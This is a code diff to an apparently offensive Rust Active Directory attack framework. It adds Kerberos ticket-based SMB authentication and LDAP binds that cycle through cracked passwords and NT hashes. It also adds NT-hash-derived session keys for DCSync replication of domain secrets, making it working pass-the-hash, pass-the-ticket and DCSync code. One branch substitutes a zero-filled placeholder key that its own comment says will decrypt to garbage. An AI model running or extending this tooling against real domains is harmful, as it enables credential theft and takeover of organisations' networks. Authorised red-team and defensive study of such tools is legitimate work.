@@ -59,6 +59,8 @@ pub struct ExecContext {
     pub ldap_available: bool,
     /// Preferred remote execution method (smbexec, wmiexec, winrmexec, psexec)
     pub preferred_method: String,
+    /// Optional Kerberos ticket file path (ccache/kirbi) for ticket-based auth
+    pub ticket_path: Option<String>,
 }
 
 impl ExecContext {
@@ -685,6 +687,66 @@ async fn ldap_connect(
     ctx: &ExecContext,
     state: &EngagementState,
 ) -> std::result::Result<ldap::LdapSession, StepResult> {
+    // Kerberos ticket auth: try anonymous LDAP (often works for read-only
+    // enumeration) or fall back to NT hash if available from cracked creds.
+    if ctx.ticket_path.is_some() {
+        // Try anonymous first (LDAP null session for read ops)
+        match ldap::LdapSession::connect_anonymous(&ctx.dc_ip, &ctx.domain, ctx.use_ldaps).await {
+            Ok(conn) => {
+                debug!("LDAP: anonymous bind succeeded (ticket auth context)");
+                return Ok(conn);
+            }
+            Err(e) => {
+                debug!(
+                    "LDAP: anonymous bind failed ({}), trying with cracked creds",
+                    e
+                );
+            }
+        }
+        // Try any cracked/stored credentials
+        for cred in state.credentials.values() {
+            if cred.secret_type == SecretType::Password {
+                match ldap::LdapSession::connect(
+                    &ctx.dc_ip,
+                    &ctx.domain,
+                    &cred.username,
+                    &cred.secret,
+                    ctx.use_ldaps,
+                )
+                .await
+                {
+                    Ok(conn) => {
+                        debug!("LDAP: bound with cracked password for {}", cred.username);
+                        return Ok(conn);
+                    }
+                    Err(_) => continue,
+                }
+            } else if cred.secret_type == SecretType::NtHash {
+                match ldap::LdapSession::connect_with_hash(
+                    &ctx.dc_ip,
+                    &ctx.domain,
+                    &cred.username,
+                    &cred.secret,
+                    ctx.use_ldaps,
+                )
+                .await
+                {
+                    Ok(conn) => {
+                        debug!("LDAP: bound with cracked NT hash for {}", cred.username);
+                        return Ok(conn);
+                    }
+                    Err(_) => continue,
+                }
+            }
+        }
+        return Err(StepResult {
+            success: false,
+            output: "LDAP bind failed: Kerberos ticket auth requires GSSAPI which is not yet supported for LDAP. Use --username/--password or --nt-hash instead.".to_string(),
+            new_credentials: 0,
+            new_admin_hosts: 0,
+        });
+    }
+
     let (user, secret, use_hash) = ctx.effective_creds();
 
     // If the operator authenticated with an NT hash, prefer cleartext if we
@@ -760,14 +822,32 @@ async fn ldap_connect(
 // SMB Connection Helper (pass-the-hash aware)
 // ===========================================================
 
-/// Connect to a target via SMB, correctly handling pass-the-hash mode.
-/// When `use_hash` is true, calls `SmbSession::connect_with_hash()` instead
-/// of `SmbSession::connect()` so the NT hash is used for NTLMv2 auth
-/// rather than being sent as a literal password string.
+/// Connect to a target via SMB, correctly handling pass-the-hash, Kerberos ticket,
+/// and password auth modes.
 async fn smb_connect(
     ctx: &ExecContext,
     target: &str,
 ) -> std::result::Result<SmbSession, StepResult> {
+    // Ticket-based auth: load the ccache/kirbi and use Kerberos session key
+    if let Some(ref ticket_path) = ctx.ticket_path {
+        let ticket =
+            overthrone_core::proto::smb::KerberosTicket::from_kirbi(ticket_path).map_err(|e| {
+                StepResult {
+                    success: false,
+                    output: format!("Failed to load Kerberos ticket from {}: {e}", ticket_path),
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                }
+            })?;
+        return SmbSession::connect_with_ticket(target, &ctx.domain, &ctx.username, ticket)
+            .await
+            .map_err(|e| StepResult {
+                success: false,
+                output: format!("SMB Kerberos connect to {}: {e}", target),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            });
+    }
     let (user, secret, use_hash) = ctx.effective_creds();
     let result = if use_hash {
         SmbSession::connect_with_hash(target, &ctx.domain, user, secret).await
@@ -5024,13 +5104,68 @@ async fn exec_dcsync(
     // Derive session key for DRS attribute decryption.
     // Prefer the real NTLM session key from the SMB authentication exchange.
     // Fall back to computing ResponseKeyNT (NTLMv2 hash) from credentials.
-    let (user, pass, _use_hash) = ctx.effective_creds();
+    let (user, pass, use_hash) = ctx.effective_creds();
     let session_key: Vec<u8> = if let Some(sk) = smb.session_key() {
         info!(
             "  Using NTLM session key from SMB auth ({} bytes)",
             sk.len()
         );
         sk
+    } else if ctx.ticket_path.is_some() {
+        // Ticket-based auth: the session key should come from the Kerberos TGS.
+        // If SMB session key is unavailable, we can't decrypt DRS attributes without
+        // the actual ticket session key. Log a warning but continue.
+        warn!(
+            "  Kerberos ticket auth: SMB session key unavailable; DRS attribute decryption may fail"
+        );
+        warn!("  Consider using --nt-hash for reliable DCSync attribute decryption");
+        vec![0u8; 16] // placeholder -- DRS decryption will produce garbage but replication may still succeed
+    } else if use_hash {
+        // Use the NT hash directly as the ResponseKeyNT (NTLMv2 case)
+        use hmac::{Hmac, Mac};
+        use md4::{Digest as Md4Digest, Md4};
+
+        // Parse hex NT hash manually (no `hex` crate dependency)
+        let nt_hash_bytes = {
+            let secret = pass.trim();
+            let mut bytes = [0u8; 16];
+            if secret.len() >= 32 && secret.as_bytes().iter().all(|b| b.is_ascii_hexdigit()) {
+                for (i, byte) in bytes.iter_mut().enumerate() {
+                    let hi = secret.as_bytes()[i * 2];
+                    let lo = secret.as_bytes()[i * 2 + 1];
+                    let h = (hi as char).to_digit(16).unwrap_or(0) as u8;
+                    let l = (lo as char).to_digit(16).unwrap_or(0) as u8;
+                    *byte = (h << 4) | l;
+                }
+            } else {
+                // Plaintext password -- derive NT hash first
+                let utf16le: Vec<u8> = secret
+                    .encode_utf16()
+                    .flat_map(|c| c.to_le_bytes())
+                    .collect();
+                let mut hasher = Md4::new();
+                hasher.update(&utf16le);
+                let result = hasher.finalize();
+                bytes.copy_from_slice(&result);
+            }
+            bytes
+        };
+
+        let user_domain = format!("{}{}", user.to_uppercase(), ctx.domain);
+        let ud_utf16: Vec<u8> = user_domain
+            .encode_utf16()
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+        let response_key = {
+            let mut mac =
+                Hmac::<md5::Md5>::new_from_slice(&nt_hash_bytes).expect("HMAC key creation failed");
+            mac.update(&ud_utf16);
+            let mut k = [0u8; 16];
+            k.copy_from_slice(&mac.finalize().into_bytes());
+            k
+        };
+        info!("  Using derived ResponseKeyNT from NT hash for DRS decryption");
+        response_key.to_vec()
     } else {
         use hmac::{Hmac, Mac};
         use md4::{Digest as Md4Digest, Md4};
